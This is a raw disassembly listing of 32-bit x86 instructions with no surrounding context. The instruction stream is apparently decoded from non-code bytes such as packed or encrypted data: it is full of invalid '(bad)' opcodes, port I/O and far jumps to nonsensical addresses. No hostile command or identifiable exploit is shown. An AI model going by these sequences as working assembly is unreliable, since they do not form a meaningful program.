  404658:	shl    DWORD PTR [esi],1
  40465a:	mov    esp,0x6f33298b
  40465f:	push   0x89f33f72
  404664:	rol    DWORD PTR [edi+ebx*1+0x8b6bb53],1
  40466b:	outs   dx,DWORD PTR ds:[esi]
  40466c:	inc    edx
  40466d:	enter  0xfefc,0x21
  404671:	(bad)  
  404672:	push   eax
  404673:	mov    ecx,0x3192e6f5
  404678:	jmp    0x40465a
  40467a:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40467c:	test   eax,0xfc4613d8
  404681:	jmp    0x1e64d95d
  404686:	add    bh,cl
  404688:	dec    ecx
  404689:	ror    BYTE PTR [eax-0x72c595c4],1
  40468f:	sbb    DWORD PTR [eax-0x31],esp
  404692:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404693:	stc    
  404694:	dec    eax
  404695:	mov    bl,0xbe
  404697:	jns    0x404686
  404699:	push   ebp
  40469a:	sub    BYTE PTR [ecx-0x6ebf836],dl
  4046a0:	push   ss
  4046a1:	or     esi,DWORD PTR [esi-0x44522648]
  4046a7:	imul   BYTE PTR [edx+0x67]
  4046aa:	test   al,0x1a
  4046ac:	retf   0x2bf9
  4046af:	in     eax,0x8
  4046b1:	sbb    ebx,edi
  4046b3:	jle    0x40468e
  4046b5:	jnp    0x404713
  4046b7:	dec    ebp
  4046b8:	lea    edi,[eax+0x3f]
  4046bb:	add    eax,0xcd9ebe6
  4046c0:	mov    ds:0x8859fd2d,eax
  4046c5:	pop    esi
  4046c6:	jae    0x40464c
  4046c8:	les    esi,FWORD PTR [edi+0x79393685]
  4046ce:	out    0x11,al
  4046d0:	shl    DWORD PTR [ebp-0x4299d697],cl
  4046d6:	push   ss
  4046d7:	cwde   
  4046d8:	mov    eax,0xb1cc319c
  4046dd:	outs   dx,BYTE PTR ds:[esi]
  4046de:	clc    
  4046df:	xor    eax,0x623c3ad3
  4046e4:	add    eax,0x1c139be
  4046e9:	sub    al,0xb4
  4046eb:	je     0x4046c0
  4046ed:	ins    DWORD PTR es:[edi],dx
  4046ee:	cmp    al,0x54
  4046f0:	add    eax,0xef520a8f
  4046f5:	or     eax,edi
  4046f7:	(bad)  [esi]
  4046f9:	pop    edx
  4046fa:	add    eax,0x8dc6570c
  4046ff:	pop    ebp
  404700:	sbb    bh,BYTE PTR [edx]
  404702:	jnp    0x4046dc
  404704:	fiadd  DWORD PTR [esi-0x58]
  404707:	or     BYTE PTR [ebp+esi*1-0x3],dh
  40470b:	jmp    0x12445bfb
  404710:	(bad)  
  404712:	pop    DWORD PTR [esi]
  404714:	inc    esp
  404715:	es es xchg ebp,eax
  404718:	aam    0x59
  40471a:	in     eax,0x78
  40471c:	test   DWORD PTR ds:0x82567c2d,0xc6344379
  404726:	ffreep st(6)
  404728:	mov    ds:0x564d5e88,al
  40472d:	int3   
  40472e:	or     dh,0x94
  404731:	popf   
  404732:	sub    BYTE PTR [edx+0x67],dl
  404735:	in     al,0x1f
  404737:	push   ecx
  404738:	popa   
  404739:	or     dh,cl
  40473b:	aad    0x23
  40473d:	mov    cl,0x33
  40473f:	mov    eax,ds:0xfa946fe3
  404744:	xlat   BYTE PTR ds:[ebx]
  404745:	cli    
  404746:	leave  
  404747:	mov    BYTE PTR [edx-0x72],bl
  40474a:	enter  0xe4e3,0x4c
  40474e:	and    bh,BYTE PTR [ebx-0x75ff8a48]
  404754:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404755:	fldpi  
  404757:	sahf   
  404758:	mov    esp,DWORD PTR [eax]
  40475a:	or     bl,BYTE PTR [esi]
  40475c:	jg     0x404703
  40475e:	lahf   
  40475f:	retf   
  404760:	ins    BYTE PTR es:[edi],dx
  404761:	mov    ds:0x5bd19214,eax
  404766:	sub    esp,DWORD PTR [ebx+0x4f]
  404769:	popf   
  40476a:	fidiv  WORD PTR [ecx-0x4bf3b091]
  404770:	push   ss
  404771:	jg     0x404782
  404773:	sbb    bh,BYTE PTR [ebx+0x75]
  404776:	inc    eax
  404777:	and    edx,esp
  404779:	(bad)  
  40477a:	rcl    BYTE PTR [ecx+edi*4+0x6e],cl
  40477e:	mov    eax,0x9dfa0b73
  404783:	inc    edx
  404784:	ins    DWORD PTR es:[edi],dx
  404785:	adc    BYTE PTR [esi],ch
  404787:	loope  0x404751
  404789:	push   es
  40478a:	lea    edx,[edx]
  40478c:	xor    BYTE PTR [ebx+0x50],bl
  40478f:	loopne 0x4047ab
  404791:	aam    0xf7
  404793:	call   0x93f9:0x75f82918
  40479a:	dec    ebp
  40479b:	data16 loop 0x404797
  40479e:	ins    BYTE PTR es:[edi],dx
  40479f:	loope  0x4047b7
  4047a1:	xor    edx,DWORD PTR [ebp+0x12]
  4047a4:	call   0x72d0:0x6302ffff
  4047ab:	arpl   WORD PTR [edx+0x5895ec98],bx
  4047b1:	xchg   edx,eax
  4047b2:	add    bl,BYTE PTR [ebp+edx*8+0x2e2e353b]
  4047b9:	or     eax,0x7f5f0494
  4047be:	mov    eax,0xd126fbd
  4047c3:	test   eax,0xdd05c0e3
  4047c8:	cmp    DWORD PTR [ebx-0x5a],0x61d50a93
  4047cf:	inc    esp
  4047d0:	mov    esp,0x136674d7
  4047d5:	pop    es
  4047d6:	test   DWORD PTR [edx],esi
  4047d8:	fdiv   QWORD PTR [eax-0x78d222b9]
  4047de:	shl    DWORD PTR [edx+0x665b9a8c],1
  4047e4:	mov    WORD PTR [ebx+eiz*2+0x1],ds
  4047e8:	and    BYTE PTR [esi+0x63],bh
  4047eb:	cwde   
  4047ec:	push   ecx
  4047ed:	jge    0x4047a6
  4047ef:	push   esi
  4047f0:	jmp    0x4047ab
  4047f2:	ins    BYTE PTR es:[edi],dx
  4047f3:	and    bl,al
  4047f5:	or     BYTE PTR [ebx-0x24994ce6],dh
  4047fb:	adc    BYTE PTR [eax-0x15d404af],al
  404801:	lahf   
  404802:	dec    edi
  404803:	add    BYTE PTR [ebp+edx*8-0x44],bl
  404807:	nop
  404808:	ss sbb ebp,edx
  40480b:	(bad)  
  40480c:	in     eax,0xf8
  40480e:	sar    edx,1
  404810:	out    0xbd,eax
  404812:	sbb    BYTE PTR [edi-0x2ed9e027],0x77
  404819:	dec    ebx
  40481a:	and    eax,0x284ad6f1
  40481f:	mov    ds:0xa94d4329,eax
  404824:	mov    cl,0x3c
  404826:	pop    ebx
  404827:	pop    esp
  404828:	out    0x85,eax
  40482a:	mov    al,ds:0x2357426
  40482f:	test   eax,0x3e11775c
  404834:	and    dl,BYTE PTR [esi]
  404836:	cmp    BYTE PTR [esi],ch
  404838:	retf   
  404839:	push   eax
  40483a:	adc    esp,DWORD PTR [ecx+0x5b]
  40483d:	inc    ebx
  40483e:	repnz lea esi,[ecx-0x34ff2cca]
  404845:	daa    
  404846:	xchg   esi,eax
  404847:	or     BYTE PTR ss:0xa2a62e81,cl
  40484e:	bound  esp,QWORD PTR [ebx+0x3589d151]
  404854:	jns    0x40489e
  404856:	mov    esi,0x8d40bf9
  40485b:	cli    
  40485c:	inc    esp
  40485d:	jge    0x40486f
  40485f:	pusha  
  404860:	inc    esi
  404861:	aam    0x31
  404863:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404864:	xor    dh,BYTE PTR [edi-0x60]
  404867:	and    al,0xdc
  404869:	loope  0x4048e7
  40486b:	(bad)  [eax+0x4a586a76]
  404872:	xor    DWORD PTR [edi-0x5691ff05],ecx
  404878:	sub    DWORD PTR [ebp+0x35],ebp
  40487b:	or     DWORD PTR [ebx-0x3cad3220],ecx
  404881:	or     al,0x12
  404883:	inc    DWORD PTR [ecx-0x5986526a]
  404889:	loope  0x404835
  40488b:	stc    
  40488c:	jnp    0x404904
  40488e:	addr16 xor dl,dh
  404891:	in     al,0xf2
  404893:	call   0xa989:0xd8a4e295
  40489a:	dec    eax
  40489b:	out    dx,eax
  40489c:	fsubr  DWORD PTR [edx]
  40489e:	clc    
  40489f:	fwait
  4048a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048a2:	lahf   
  4048a3:	(bad)  
  4048a4:	mov    edx,0xe7783916
  4048a9:	jbe    0x4048af
  4048ab:	jecxz  0x404847
  4048ad:	fistp  WORD PTR [edx]
  4048af:	lds    edi,FWORD PTR [esi]
  4048b1:	repnz adc BYTE PTR [edx],cl
  4048b4:	aaa    
  4048b5:	and    ch,BYTE PTR [ebx-0x11]
  4048b8:	push   0x47
  4048ba:	pop    ds
  4048bb:	sbb    DWORD PTR [eax-0x76a2707e],edi
  4048c1:	or     DWORD PTR [ecx-0x1c],ecx
  4048c4:	iret   
  4048c5:	(bad)  
  4048c6:	clc    
  4048c7:	dec    ebx
  4048c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048c9:	fcom   DWORD PTR [edx-0x62]
  4048cc:	outs   dx,DWORD PTR ds:[esi]
  4048cd:	push   edx
  4048ce:	popa   
  4048cf:	stos   DWORD PTR es:[edi],eax
  4048d0:	in     al,dx
  4048d1:	xor    edx,DWORD PTR es:[ebx+0x61]
  4048d5:	ror    DWORD PTR [edx-0x4a],0x14
  4048d9:	cvtps2pi mm4,QWORD PTR [ebx-0x382e090f]
  4048e0:	xor    al,0x8
  4048e2:	inc    ecx
  4048e3:	pop    es
  4048e4:	cmp    al,al
  4048e6:	xchg   edi,eax
  4048e7:	(bad)  
  4048e8:	adc    dh,BYTE PTR ds:0x169ae834
  4048ee:	sahf   
  4048ef:	lods   eax,DWORD PTR ds:[esi]
  4048f0:	push   eax
  4048f1:	inc    esi
  4048f2:	mov    esi,0x937d99c4
  4048f7:	cwde   
  4048f8:	jnp    0x404903
  4048fa:	mov    ebx,0x64cdb7d5
  4048ff:	popa   
  404900:	xor    DWORD PTR [esi-0x21642bf0],ecx
  404906:	(bad)  
  404907:	mov    esi,0x8e097b22
  40490c:	sar    esi,cl
  40490e:	pop    ecx
  40490f:	xor    bh,dl
  404911:	jb     0x404980
  404913:	pop    edx
  404914:	pop    ss
  404915:	call   0xe3fcc278
  40491a:	xor    al,0xf3
  40491c:	cmp    eax,0x71357f63
  404921:	or     al,0x81
  404923:	scas   eax,DWORD PTR es:[edi]
  404924:	mov    ?,ebp
  404926:	jp     0x404961
  404928:	sbb    eax,0x21b2b3b1
  40492d:	out    0x13,eax
  40492f:	dec    edx
  404930:	and    BYTE PTR [esp+edi*2],0xb2
  404934:	xchg   ecx,eax
  404935:	sub    al,0x24
  404937:	add    esi,esp
  404939:	fcom   st(3)
  40493b:	sbb    DWORD PTR [eax],ebx
  40493d:	gs sahf 
  40493f:	xlat   BYTE PTR ds:[ebx]
  404940:	aas    
  404941:	dec    ecx
  404942:	or     al,0x87
  404944:	or     edi,esp
  404946:	retf   0xe8ac
  404949:	mov    dh,0x19
  40494b:	jmp    0x5a3d9915
  404950:	sub    dh,bl
  404952:	cmp    DWORD PTR ds:0x8f5376fb,esi
  404958:	or     eax,0x10d43e72
  40495d:	mov    al,0x7d
  40495f:	stc    
  404960:	inc    ecx
  404961:	adc    ch,BYTE PTR [esi]
  404963:	nop
  404964:	xor    eax,0xf6ff0a1a
  404969:	jo     0x40492c
  40496b:	pop    ds
  40496c:	dec    DWORD PTR [eax+0x3c709add]
  404972:	lea    eax,[ebx+0x45]
  404975:	sbb    DWORD PTR [ecx],ecx
  404977:	dec    ecx
  404978:	mov    ch,0xf
  40497a:	mov    ds:0x2409ca6c,eax
  40497f:	mov    cl,BYTE PTR [ecx+0x1985b5e2]
  404985:	xor    BYTE PTR [ecx+edx*2-0x62d3d674],0xfc
  40498d:	sub    cl,dh
  40498f:	or     edx,DWORD PTR [edi+0x57]
  404992:	adc    bl,dh
  404994:	sub    DWORD PTR [esi-0x2722dac],eax
  40499a:	xchg   ebx,eax
  40499b:	push   ss
  40499c:	scas   al,BYTE PTR es:[edi]
  40499d:	mov    dl,0x10
  40499f:	ins    BYTE PTR es:[edi],dx
  4049a0:	jmp    0x4fd4:0xff4b21c4
  4049a7:	jl     0x40499e
  4049a9:	jns    0x404962
  4049ab:	adc    al,0x34
  4049ad:	popa   
  4049ae:	or     al,0x5c
  4049b0:	cld    
  4049b1:	adc    BYTE PTR [edx+0x15],bh
  4049b4:	test   DWORD PTR [eax-0x1b],0x3b8a5913
  4049bb:	pop    ecx
  4049bc:	pop    es
  4049bd:	and    al,0xc8
  4049bf:	es inc ebx
  4049c1:	jmp    0x404a04
  4049c3:	popa   
  4049c4:	dec    ebp
  4049c5:	jae    0x40494e
  4049c7:	in     eax,0x8
  4049c9:	out    0x34,al
  4049cb:	jle    0x404a28
  4049cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049ce:	xchg   esp,eax
  4049cf:	loop   0x404962
  4049d1:	mov    ah,0x81
  4049d3:	xor    eax,0x360a07f5
  4049d8:	xchg   ebp,eax
  4049d9:	xor    al,0xb8
  4049db:	retf   
  4049dc:	sub    BYTE PTR [eax],0xb6
  4049df:	or     eax,0xec14707b
  4049e4:	ror    al,0xbe
  4049e7:	sbb    eax,0x414d6c6c
  4049ec:	mov    dh,0x21
  4049ee:	pop    ebp
  4049ef:	ins    DWORD PTR es:[edi],dx
  4049f0:	adc    eax,0x1d12d440
  4049f5:	adc    ebx,eax
  4049f7:	push   edi
  4049f8:	test   DWORD PTR [esi],edx
  4049fa:	xchg   BYTE PTR [edi-0x1d],dl
  4049fd:	ins    DWORD PTR es:[edi],dx
  4049fe:	daa    
  4049ff:	cmp    ecx,esi
  404a01:	add    esi,DWORD PTR [ecx-0x62]
  404a04:	test   eax,0x1e054629
  404a09:	or     BYTE PTR [eax],0x9c
  404a0c:	cmp    BYTE PTR [ebx-0x1e],al
  404a0f:	repz xchg ebx,eax
  404a11:	ud2    
  404a13:	mov    bh,0xcb
  404a15:	out    0xcc,eax
  404a17:	push   0xffffffca
  404a19:	dec    ecx
  404a1a:	xchg   edx,eax
  404a1b:	and    BYTE PTR ss:[esi],ah
  404a1e:	loop   0x404a19
  404a20:	fild   QWORD PTR [esi-0x1f]
  404a23:	mov    ch,0x91
  404a25:	loope  0x404a56
  404a27:	dec    edi
  404a28:	xor    bl,BYTE PTR [ecx]
  404a2a:	mov    DWORD PTR [ebx],esp
  404a2c:	xchg   ecx,eax
  404a2d:	inc    ecx
  404a2e:	rol    BYTE PTR [edx-0x4be82dac],1
  404a34:	imul   eax,DWORD PTR [eax+ecx*2+0x35],0xffffffd2
  404a39:	mov    dl,0xa2
  404a3b:	jle    0x404a0d
  404a3d:	js     0x404a3b
  404a3f:	push   edx
  404a40:	fdivr  DWORD PTR [edx+esi*8-0x39]
  404a44:	(bad)  
  404a45:	dec    BYTE PTR [ebx-0x5b77eba5]
  404a4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a4c:	add    al,0x99
  404a4e:	aas    
  404a4f:	or     al,0x16
  404a51:	sub    eax,0xdf5b8520
  404a56:	clc    
  404a57:	(bad)  
  404a58:	cmp    BYTE PTR [ebp+0x11],cl
  404a5b:	lahf   
  404a5c:	fwait
  404a5d:	outs   dx,BYTE PTR ds:[esi]
  404a5e:	adc    edx,DWORD PTR [edi+0x78]
  404a61:	sbb    dl,bl
  404a63:	pop    ebx
  404a64:	xchg   ecx,eax
  404a65:	pop    ebx
  404a66:	or     al,BYTE PTR [ecx+0xd]
  404a69:	sbb    bl,0x9b
  404a6c:	imul   edi,DWORD PTR [esi-0x1a],0x50
  404a70:	jge    0x404ac0
  404a72:	adc    eax,0x87d37757
  404a77:	cmp    BYTE PTR [ebx-0x6],dl
  404a7a:	enter  0xd24e,0x74
  404a7e:	loope  0x404af7
  404a80:	cmp    DWORD PTR [ecx-0x77b01267],eax
  404a86:	rol    DWORD PTR [edi-0x78],0xff
  404a8a:	jmp    0x404a6a
  404a8c:	fbstp  TBYTE PTR [ebp+edx*2-0x76f71322]
  404a93:	sbb    esi,DWORD PTR [edi+eiz*8]
  404a96:	pop    DWORD PTR [edx+0x10]
  404a99:	mov    bl,0x95
  404a9b:	cli    
  404a9c:	mov    eax,ds:0xcdc7dfa7
  404aa1:	pop    ebx
  404aa2:	dec    ecx
  404aa3:	or     al,0x39
  404aa5:	sti    
  404aa6:	and    BYTE PTR [esi],dh
  404aa8:	jp     0x404aee
  404aaa:	test   eax,0x955b7c23
  404aaf:	movaps XMMWORD PTR [ebx+eax*8+0x4d52ef82],xmm2
  404ab7:	xor    bh,dh
  404ab9:	jb     0x404a5d
  404abb:	mov    bl,0xd5
  404abe:	addr16 mov al,0xd7
  404ac1:	xchg   edi,eax
  404ac2:	hlt    
  404ac3:	push   ss
  404ac4:	adc    dh,bl
  404ac6:	push   edx
  404ac7:	jnp    0x404b20
  404ac9:	cli    
  404aca:	fstp   QWORD PTR [edi-0x46ca0c00]
  404ad0:	sub    ebp,0x7393c514
  404ad6:	inc    eax
  404ad7:	test   eax,0x8fbe0eb6
  404adc:	cmp    eax,0xe75dfd0e
  404ae1:	cmp    al,BYTE PTR [ecx]
  404ae3:	imul   ebp,DWORD PTR [ebx+eiz*1-0x2c98d106],0xffffffc8
  404aeb:	jo     0x404a6d
  404aed:	or     cl,BYTE PTR [ebx-0x41]
  404af0:	(bad)  
  404af1:	fsub   DWORD PTR [edx-0x307d7195]
  404af7:	sub    al,0x68
  404af9:	xchg   esp,eax
  404afa:	sbb    eax,0x1ee28c69
  404aff:	pop    edx
  404b00:	jecxz  0x404acf
  404b02:	add    al,dl
  404b04:	jp     0x404b49
  404b06:	cmp    DWORD PTR [ebx+edi*4],ebp
  404b09:	fcom   DWORD PTR [ebp+0x29]
  404b0c:	in     eax,dx
  404b0d:	adc    eax,0xbf19e41d
  404b12:	sub    cl,dh
  404b14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b15:	xchg   edi,eax
  404b16:	nop
  404b17:	les    edi,FWORD PTR [edx-0x36f66b03]
  404b1d:	repz pop ss
  404b1f:	mov    ch,0x1d
  404b21:	sbb    DWORD PTR [esi+0x17],esi
  404b24:	data16 js 0x404af5
  404b27:	inc    edi
  404b28:	das    
  404b29:	scas   al,BYTE PTR es:[edi]
  404b2a:	lahf   
  404b2b:	xor    ecx,DWORD PTR [edx-0x5dbcfbfa]
  404b31:	dec    edi
  404b32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b33:	cwde   
  404b34:	lods   eax,DWORD PTR ds:[esi]
  404b35:	into   
  404b36:	pushf  
  404b37:	cld    
  404b38:	sub    ah,ch
  404b3a:	sar    BYTE PTR [ecx+0x594e238f],0x17
  404b41:	int3   
  404b42:	jo     0x404ae3
  404b44:	daa    
  404b45:	data16 daa 
  404b47:	cmp    al,0x5e
  404b49:	dec    edx
  404b4a:	add    DWORD PTR ds:0x2a870eef,edi
  404b50:	lods   eax,DWORD PTR ds:[esi]
  404b51:	add    cl,BYTE PTR [ecx-0x37e8da91]
  404b57:	pushf  
  404b58:	adc    eax,0x76042692
  404b5d:	and    ebp,ebp
  404b5f:	inc    ecx
  404b60:	jne    0x404b54
  404b62:	xchg   esp,eax
  404b63:	idiv   DWORD PTR [eax+0x4c581bbd]
  404b69:	(bad)  
  404b6a:	sbb    edx,DWORD PTR [ebx]
  404b6c:	addr16 inc eax
  404b6e:	pop    ds
  404b6f:	dec    BYTE PTR [edi+0x15d7b63d]
  404b75:	fdivrp st(5),st
  404b77:	and    cl,BYTE PTR [ebp+esi*8-0x2c]
  404b7b:	dec    ebx
  404b7c:	pop    ds
  404b7d:	push   edx
  404b7e:	sbb    eax,0x23fb5578
  404b83:	ins    BYTE PTR es:[edi],dx
  404b84:	call   0x73b7:0x603bf25e
  404b8b:	inc    edx
  404b8c:	pop    ebx
  404b8d:	inc    ebp
  404b8e:	or     al,0xd4
  404b90:	daa    
  404b91:	jae    0x404b15
  404b93:	fsubrp st(5),st
  404b95:	push   0x3e
  404b97:	gs or  al,0x84
  404b9a:	xlat   BYTE PTR ds:[ebx]
  404b9b:	je     0x404bec
  404b9d:	repz and esp,DWORD PTR [ebx+0x68]
  404ba1:	(bad)  
  404ba3:	mul    ah
  404ba5:	pop    edi
  404ba6:	cli    
  404ba7:	add    al,0x80
  404ba9:	jne    0x404b38
  404bab:	inc    edx
  404bac:	shl    DWORD PTR [esi+edi*4-0x58],1
  404bb0:	sub    bl,0xa8
  404bb3:	dec    ecx
  404bb4:	mov    bl,0xe8
  404bb6:	or     eax,0x6fc28368
  404bbb:	xchg   BYTE PTR [eax+0x6b0cf7a5],cl
  404bc1:	xor    eax,0x8bd33d85
  404bc6:	jns    0x404bad
  404bc8:	es xchg esp,eax
  404bca:	push   0x3e069646
  404bcf:	pusha  
  404bd0:	outs   dx,DWORD PTR ds:[esi]
  404bd1:	imul   edi,DWORD PTR [eax+0x6f],0x67f6fca0
  404bd8:	je     0x404b74
  404bda:	inc    esi
  404bdb:	cmp    edi,esi
  404bdd:	jp     0x404b89
  404bdf:	dec    ebx
  404be0:	or     DWORD PTR [ebp+0x5016693d],ecx
  404be6:	shr    esi,1
  404be8:	cmp    cl,BYTE PTR [esi]
  404bea:	jnp    0x404c4d
  404bec:	xor    DWORD PTR ds:0x7b7e0ffa,0xffffff8a
  404bf3:	xlat   BYTE PTR ds:[ebx]
  404bf4:	add    BYTE PTR [ecx],bl
  404bf6:	pop    es
  404bf7:	add    al,0x19
  404bf9:	(bad)  
  404bfa:	add    BYTE PTR [ecx+0x59],0xe8
  404bfe:	inc    ebx
  404bff:	dec    ecx
  404c00:	cdq    
  404c01:	fild   QWORD PTR [edx+0x64]
  404c04:	test   eax,0x5112132a
  404c09:	xchg   esp,eax
  404c0a:	add    bl,BYTE PTR [ecx]
  404c0c:	loopne 0x404b94
  404c0e:	cmp    al,BYTE PTR [esi-0x42]
  404c11:	repnz dec edi
  404c13:	mov    bh,0xae
  404c15:	dec    esi
  404c16:	clc    
  404c17:	fnstenv [ecx+0x79]
  404c1a:	div    BYTE PTR [eax]
  404c1c:	pop    edi
  404c1d:	push   edi
  404c1e:	bound  ecx,QWORD PTR [esi-0x67]
  404c21:	cmp    eax,0x889e054c
  404c26:	test   eax,0x1811d050
  404c2b:	mov    bl,0x58
  404c2d:	pop    esi
  404c2e:	pop    es
  404c2f:	mov    ch,0x6b
  404c31:	stos   DWORD PTR es:[edi],eax
  404c32:	pop    edi
  404c33:	xor    ebp,DWORD PTR [edx]
  404c35:	sar    bh,1
  404c37:	pop    esp
  404c38:	sub    bl,ch
  404c3a:	xor    al,0x5d
  404c3c:	lea    edx,[eax+0xb]
  404c3f:	push   esi
  404c40:	or     al,0x7f
  404c42:	call   0x3fd6:0xd36f714b
  404c49:	retf   0x8b9e
  404c4c:	mov    dl,BYTE PTR [edx-0x37]
  404c4f:	mov    eax,0xf63117bd
  404c54:	nop
  404c55:	xor    al,dl
  404c57:	mov    ecx,0xf96799b3
  404c5c:	xchg   ebx,eax
  404c5d:	cld    
  404c5e:	aam    0x6f
  404c60:	std    
  404c61:	inc    ebx
  404c62:	mov    eax,ds:0xe9326490
  404c67:	mov    al,ds:0x1facefdc
  404c6c:	and    al,0xc8
  404c6e:	dec    edx
  404c6f:	sub    ebp,DWORD PTR [eax+0x42]
  404c72:	inc    ebp
  404c73:	push   0x43fa63cb
  404c78:	lahf   
  404c79:	push   edx
  404c7a:	dec    ebp
  404c7b:	adc    bh,bh
  404c7d:	hlt    
  404c7e:	js     0x404c89
  404c80:	jge    0x404c8f
  404c82:	call   0x88351a54
  404c87:	mov    dl,0xc
  404c89:	pop    ds
  404c8a:	adc    esi,edi
  404c8c:	pop    es
  404c8d:	jg     0x404c78
  404c8f:	pop    esp
  404c90:	nop
  404c91:	call   0xc6ba:0xed6cfbf8
  404c98:	sub    DWORD PTR [edi],ebp
  404c9a:	(bad)  
  404c9c:	dec    edi
  404c9d:	rcr    DWORD PTR [eax+0x2fb1e779],0x86
  404ca4:	xchg   esp,eax
  404ca5:	(bad)  
  404ca6:	mov    bh,0x88
  404ca8:	cli    
  404ca9:	fsubr  DWORD PTR [ebp+edi*1+0x676899d9]
  404cb0:	mov    eax,0x3b2b1ef2
  404cb5:	jp     0x404cc3
  404cb7:	push   ebx
  404cb8:	add    DWORD PTR [edx+0x2e],esp
  404cbb:	adc    eax,0xeb614096
  404cc0:	mov    al,ds:0x3daa91d9
  404cc5:	dec    ebp
  404cc6:	int3   
  404cc7:	hlt    
  404cc8:	lds    esp,FWORD PTR [edi]
  404cca:	mov    bh,0x2d
  404ccc:	sub    bl,BYTE PTR [esi]
  404cce:	dec    ebp
  404ccf:	cmp    eax,0x56159648
  404cd4:	fist   DWORD PTR [ecx]
  404cd6:	ins    DWORD PTR es:[edi],dx
  404cd7:	je     0x404c89
  404cd9:	les    esi,FWORD PTR [ecx]
  404cdb:	pop    ds
  404cdc:	imul   ecx,DWORD PTR [eax+0xaa4a4e1],0x74f153b5
  404ce6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ce7:	pop    ebp
  404ce8:	(bad)  
  404ce9:	xor    al,0x22
  404ceb:	or     bl,BYTE PTR [ebp+esi*8-0x7f93dd9e]
  404cf2:	jg     0x404d47
  404cf4:	test   al,0x9c
  404cf6:	fsub   st(6),st
  404cf8:	mov    edi,0xde339718
  404cfd:	mov    eax,ds:0x3efc425d
  404d02:	and    al,BYTE PTR [esp+edx*4+0x69c2ad98]
  404d09:	sub    BYTE PTR [eax-0x6d9855e7],ah
  404d0f:	mov    WORD PTR [ebp+0x5ab4e426],fs
  404d15:	mov    ds:0x6929c6e5,al
  404d1a:	(bad)  
  404d1b:	cli    
  404d1c:	retf   
  404d1d:	imul   eax,DWORD PTR [edi-0x64],0xffffffb2
  404d21:	in     al,dx
  404d22:	inc    ebp
  404d23:	dec    ecx
  404d24:	outs   dx,DWORD PTR ds:[esi]
  404d25:	in     al,0x56
  404d27:	out    0xa7,eax
  404d29:	xchg   edi,eax
  404d2a:	sbb    ecx,DWORD PTR [ebp-0x6b29d312]
  404d30:	xchg   edi,eax
  404d31:	in     al,0xc9
  404d33:	jge    0x404cf6
  404d35:	inc    edx
  404d36:	fiadd  DWORD PTR [edi]
  404d38:	mov    ebp,DWORD PTR [esi+edx*8-0x239387e6]
  404d3f:	shl    DWORD PTR ds:0x12c3080e,cl
  404d45:	cmc    
  404d46:	mov    al,0x28
  404d48:	mov    BYTE PTR [esp+ecx*4],bl
  404d4b:	int3   
  404d4c:	adc    dl,ch
  404d4e:	and    ebx,esp
  404d50:	out    0x6b,al
  404d52:	mov    eax,DWORD PTR [ecx]
  404d54:	cli    
  404d55:	mov    edx,DWORD PTR [edx-0x2fe5b61b]
  404d5b:	mov    edx,0xad81de53
  404d60:	rcr    DWORD PTR [ebx+0xb],0x97
  404d64:	pop    ecx
  404d65:	repnz dec ecx
  404d67:	xchg   BYTE PTR [ebx],bh
  404d69:	and    ebx,DWORD PTR [esi+0x45dbe760]
  404d6f:	sti    
  404d70:	lods   al,BYTE PTR ds:[esi]
  404d71:	push   ss
  404d72:	mov    eax,0x47bdafdd
  404d77:	cwde   
  404d78:	es mov ah,cl
  404d7b:	loopne 0x404d5b
  404d7d:	xchg   edi,eax
  404d7e:	cmp    BYTE PTR [ecx+0x7070796f],cl
  404d84:	mov    al,ds:0x238edb85
  404d89:	add    bl,BYTE PTR [edx+edx*2-0x50]
  404d8d:	inc    esp
  404d8e:	and    al,0x56
  404d90:	icebp  
  404d91:	ja     0x404daa
  404d93:	loop   0x404d4b
  404d95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d96:	sahf   
  404d97:	lea    ecx,[edi-0x19]
  404d9a:	pop    eax
  404d9b:	loopne 0x404db3
  404d9d:	push   edi
  404d9e:	outs   dx,BYTE PTR ds:[esi]
  404d9f:	add    al,0x8d
  404da1:	call   0x780e207e
  404da6:	es es ds jl 0x404de2
  404dab:	mov    ecx,0x694f2120
  404db0:	add    dh,BYTE PTR [ecx]
  404db2:	and    eax,0x85b3d12a
  404db7:	inc    edx
  404db8:	ds cdq 
  404dba:	lods   al,BYTE PTR ds:[esi]
  404dbb:	js     0x404dec
  404dbd:	loope  0x404df2
  404dbf:	push   ecx
  404dc0:	add    BYTE PTR [ebp-0x54],ah
  404dc3:	popa   
  404dc4:	add    dh,BYTE PTR [esi]
  404dc6:	in     al,dx
  404dc7:	fbld   TBYTE PTR [esi+0x4313f9f6]
  404dcd:	inc    esi
  404dce:	dec    ebp
  404dcf:	jb     0x404d5f
  404dd1:	sbb    al,0xac
  404dd3:	fsub   QWORD PTR [esi-0x2e]
  404dd6:	push   ecx
  404dd7:	cli    
  404dd8:	mov    esi,0x602dcfee
  404ddd:	and    esi,DWORD PTR ds:0x3de2355f
  404de3:	dec    edi
  404de4:	das    
  404de5:	xlat   BYTE PTR ds:[ebx]
  404de6:	mov    ?,WORD PTR [ecx]
  404de8:	add    ecx,eax
  404dea:	xor    DWORD PTR [eax-0x19ac8ccc],eax
  404df0:	cmp    esp,DWORD PTR [ebx+eax*8]
  404df3:	cmp    BYTE PTR [esi-0xce339ad],ah
  404df9:	add    al,BYTE PTR [ebp+0x3ea673c2]
  404dff:	loop   0x404dd2
  404e01:	sbb    DWORD PTR [ecx],ecx
  404e03:	push   es
  404e04:	mov    esp,DWORD PTR [ebx]
  404e06:	jbe    0x404e49
  404e08:	jmp    0x404dca
  404e0a:	repz pop es
  404e0c:	inc    ebp
  404e0d:	(bad)  
  404e0e:	pop    ds
  404e0f:	mov    ebx,0x88411fef
  404e14:	int3   
  404e15:	and    BYTE PTR [eax+0x455c6e29],al
  404e1b:	mov    ah,0xa3
  404e1d:	dec    ebp
  404e1e:	mov    dh,0x56
  404e20:	inc    ebx
  404e21:	cmp    bh,0xba
